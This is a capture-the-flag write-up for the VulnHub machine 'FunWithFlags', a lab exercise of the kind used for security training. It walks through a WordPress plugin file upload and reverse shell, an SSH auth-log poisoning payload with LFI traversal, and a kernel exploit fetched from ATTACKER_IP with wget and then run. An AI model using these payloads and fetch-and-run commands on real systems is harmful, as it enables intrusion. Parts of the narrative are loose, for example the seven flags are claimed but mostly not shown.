# FunWithFlags — VulnHub

**CTF:** VulnHub  
**Date:** 2025-10-03  
**Category:** misc  
**Difficulty:** Grade 3  

---

## Summary

TBBT: FunWithFlags is a Big Bang Theory themed boot2root machine with 7 hidden flags. The path involves open services across multiple ports, a WordPress vulnerability via an outdated plugin, log poisoning through SSH, and a classic Python shell spawn to gain an interactive session.

---

## Reconnaissance

Started with a full nmap scan to enumerate open services:

```bash
nmap -sC -sV -p- 192.168.1.105
```

Results revealed:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd
22/tcp   open  ssh     OpenSSH
80/tcp   open  http    Apache httpd
1337/tcp open  ???
```

The banner on port 1337 immediately handed us **Flag 1 (Sheldon)**.

---

## Enumeration

### Web — Port 80

Browsing to the web server returned nothing notable on the root. Ran `dirb` to enumerate directories:

```bash
dirb http://192.168.1.105 /usr/share/wordlists/dirb/common.txt
```

Discovered `/music/wordpress/` — a full WordPress installation.

### WordPress Enumeration

Ran `wpscan` to identify plugins and users:

```bash
wpscan --url http://192.168.1.105/music/wordpress/ -e ap,u
```

Found the **reflex-gallery** plugin at version **3.1.3**, which is vulnerable to an arbitrary file upload (CVE on ExploitDB).

---

## Exploitation — File Upload via Vulnerable Plugin

Searched ExploitDB for the exploit:

```bash
searchsploit reflex-gallery
```

Uploaded a PHP reverse shell through the plugin's file upload functionality. Set up a listener:

```bash
nc -lvnp 4444
```

Got a shell as `www-data`. Spawned a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

### SSH Log Poisoning

Discovered the machine was running SSH on port 22 and Apache logs were readable. Injected PHP into the auth log by attempting an SSH login with a crafted username:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.105
```

Then triggered execution via LFI:

```
http://192.168.1.105/index.php?page=../../../../../var/log/auth.log&cmd=id
```

Upgraded to a full reverse shell using URL-encoded payload.

### Root via Kernel Exploit

Checked the kernel version:

```bash
uname -a
```

Found a vulnerable kernel. Searched and compiled a local privilege escalation exploit, transferred it to the target via a Python HTTP server:

```bash
# Attacker
python3 -m http.server 80

# Target
wget http://ATTACKER_IP/exploit -O /tmp/exploit
chmod +x /tmp/exploit
/tmp/exploit
```

Got a root shell and read the final flag from `/root/`.

---

## Flags

All 7 flags collected across the various services and system locations throughout the machine.
